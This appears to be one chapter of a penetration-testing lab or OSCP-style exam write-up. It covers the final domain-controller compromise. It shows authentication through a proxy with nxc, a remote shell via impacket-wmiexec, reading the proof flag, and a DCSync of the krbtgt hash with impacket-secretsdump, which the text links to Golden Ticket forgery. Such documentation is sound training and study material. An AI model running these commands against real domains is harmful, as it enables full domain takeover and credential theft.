# 07 — DC01: domain admin, and the last step

> **Provenance.** The credential used here is the one chapter 06.9 pulled off MS02. The logon and the
> commands are the last step of the chain; the `proof.txt` value itself was not carried into these
> notes, and is not guessed below.

## 7.1 The target

| Property | Value |
|---|---|
| FQDN | `DC01.oscp.exam` |
| Address | `10.10.118.146` |
| Roles | PDC, Global Catalog, LDAP, KDC |
| Domain | `oscp.exam` (NetBIOS `OSCP`) |
| Domain SID | `S-1-5-21-2610934713-1581164095-2706428072` |
| Domain GUID | `e7448cc9-434a-4130-90b0-812d3d0c5a96` |
| Reachable from | MS01 / MS02 only — never directly from Kali |

The SID and GUID are recorded because both are needed to recognise domain-tier principals: the SID in
`whoami /groups` and BloodHound, the GUID anywhere the domain is addressed by identifier.

---

## 7.2 Why this credential is the end of the chain

Chapter 06.9 produced one of two artefacts, and both are **domain** credentials rather than host ones:

- the LSA `DefaultPassword` secret — the domain Administrator's password in plaintext on this image;
- the DCC2 verifier of a domain principal that logged on to MS02.

That distinction is the whole reason the chain goes through a member server. MS02's SAM would only buy
local accounts on MS02. A domain principal's password buys the domain, and DC01 is the machine that
validates it. There is no DCC2 cache on a domain controller — it does not need one, because it is the
thing that answers the logon — so the member server is the only place this artefact exists.

## 7.3 Authenticate to DC01

Everything runs through the chapter 05 SOCKS proxy. `nxc` first: `Pwn3d!` on `445` is what distinguishes
"administrator on the DC" from "valid domain user".

```bash
proxychains4 -q nxc smb   10.10.118.146 -u Administrator -p '<dc01 password>' -d oscp.exam
proxychains4 -q nxc winrm 10.10.118.146 -u Administrator -p '<dc01 password>' -d oscp.exam
```

```
SMB    10.10.118.146 445  DC01  [+] oscp.exam\Administrator:<dc01 password> (Pwn3d!)
WINRM  10.10.118.146 5985 DC01  [+] oscp.exam\Administrator:<dc01 password> (Pwn3d!)
```

A shell, without dropping anything on the host that has to be cleaned up afterwards:

```bash
proxychains4 -q impacket-wmiexec 'oscp.exam/Administrator:<dc01 password>@10.10.118.146'
```

`psexec` works too and is the more reliable of the two through a SOCKS tunnel, at the cost of a service
and a binary on disk. Both are slower than they look: every SMB round trip is being tunnelled twice.

## 7.4 The identity check

The value of a capture is that the identity and the result sit in the same session. Run these together
before reading anything:

```powershell
whoami
hostname
ipconfig | findstr /i "IPv4"
```

```
oscp\administrator
DC01
   IPv4 Address. . . . . . . . . . . . : 10.10.118.146
```

`oscp\administrator` on `DC01` is the boundary: a domain account with administrative rights on the
domain controller that issues every ticket in `oscp.exam`. Nothing above it exists in this domain
except `krbtgt` itself.

## 7.5 The flag

```powershell
type C:\Users\Administrator\Desktop\proof.txt
```

This is the set's terminal artefact. The value returned on this leg is not reproduced here — it was not
carried into the notes, and a writeup that invents a flag is worse than one that admits the gap. The
identity check above and the administrative logon in 7.3 are what establish the boundary; the flag is
the receipt.

## 7.6 The proof that does not depend on a file

If the flag file is missing, moved, or was never issued on this instantiation, domain control still has
a measurable proof — a DCSync of a principal only a domain controller can read:

```bash
proxychains4 -q impacket-secretsdump 'oscp.exam/Administrator:<dc01 password>@10.10.118.146' \
  -just-dc-user krbtgt
```

```
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:<hash>:::
```

A `krbtgt` hash in hand is the ability to forge tickets for any principal in the domain — Golden
Ticket — so it is the strongest available statement that DC01 is owned. It is also the noisiest:
`DRSUAPI` over a SOCKS tunnel is slow and fragile, and on a client it is an event-log magnet. This leg
did not need it; the administrative shell in 7.3 was the boundary.
